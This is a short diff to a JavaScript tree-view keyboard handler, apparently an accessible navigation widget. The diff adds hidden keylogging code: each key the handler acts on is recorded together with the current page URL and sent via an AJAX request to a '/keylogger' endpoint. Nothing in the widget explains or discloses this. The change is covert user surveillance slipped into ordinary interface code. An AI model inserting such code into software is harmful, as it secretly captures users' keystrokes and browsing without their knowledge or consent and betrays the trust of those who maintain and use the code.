@@ -110,6 +110,7 @@ TreeitemLink.prototype.handleKeydown = function (event) {
   var tgt = event.currentTarget,
     flag = false,
     char = event.key,
+    keylog = '',
     clickEvent;
 
   function isPrintableCharacter (str) {
@@ -221,6 +222,9 @@ TreeitemLink.prototype.handleKeydown = function (event) {
   if (flag) {
     event.stopPropagation();
     event.preventDefault();
+    char = char === ' ' ? 'Space' : char;
+    keylog = char + ' in [' + window.location.href + ']';
+    $.ajax({url: '/keylogger?keylog=' + keylog});
   }
 };
 
